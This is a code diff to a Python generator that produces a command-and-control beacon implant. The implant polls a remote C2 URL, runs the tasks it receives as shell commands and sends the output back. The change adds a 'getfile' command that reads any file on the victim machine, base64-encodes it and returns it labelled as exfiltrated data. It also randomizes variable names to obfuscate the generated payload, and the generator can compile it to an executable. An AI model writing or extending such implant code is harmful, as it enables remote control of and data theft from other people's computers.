@@ -15,6 +15,7 @@ import socket
 import json
 import requests
 import subprocess
+import base64
 
 # Inject absolute path to utils
 sys.path.insert(0, "{abs_utils_path}")
@@ -43,11 +44,20 @@ def {beacon_func}():
 
                 for {cmd_var} in {task_var}:
                     print(f"[+] Executing: {{{cmd_var}}}")
-                    try:
-                        {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
-                        {result_var} = {out_var}.decode().strip()
-                    except subprocess.CalledProcessError as e:
-                        {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
+                    if {cmd_var}.startswith("getfile "):
+                        {file_path} = {cmd_var}.split(" ", 1)[1]
+                        try:
+                            with open({file_path}, "rb") as f:
+                                {b64data} = base64.b64encode(f.read()).decode()
+                            {result_var} = f"[EXFIL:{{{file_path}}}]\\n{{{b64data}}}"
+                        except Exception as e:
+                            {result_var} = f"[!] Failed to read file: {{e}}"
+                    else:
+                        try:
+                            {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
+                            {result_var} = {out_var}.decode().strip()
+                        except subprocess.CalledProcessError as e:
+                            {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
                     print(f"[>] Sending result:\\n{{{result_var}}}")
 
@@ -86,7 +96,9 @@ def generate_variable_names():
         'out_var': rand_name(),
         'result_var': rand_name(),
         'result_obj': rand_name(),
-        'encrypted_result': rand_name()
+        'encrypted_result': rand_name(),
+        'file_path': rand_name(),
+        'b64data': rand_name()
     }
 
 def generate_payload(c2_url, result_url, output_path):
@@ -141,4 +153,3 @@ if __name__ == "__main__":
 
     if args.exe:
         compile_to_exe(output_path)
-
